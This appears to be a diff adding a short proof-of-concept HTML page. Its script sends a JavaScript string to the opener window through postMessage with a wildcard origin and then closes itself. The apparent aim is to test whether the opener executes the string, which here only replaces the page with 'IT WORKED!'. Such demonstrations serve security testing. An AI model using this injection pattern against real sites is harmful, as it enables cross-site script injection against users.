@@ -1,0 +1,5 @@
+<script>
+payload = "document.body.innerHTML = '<h1>IT WORKED!</h1>';";
+window.opener.postMessage({maVariable: payload}, '*');
+window.close();
+</script>
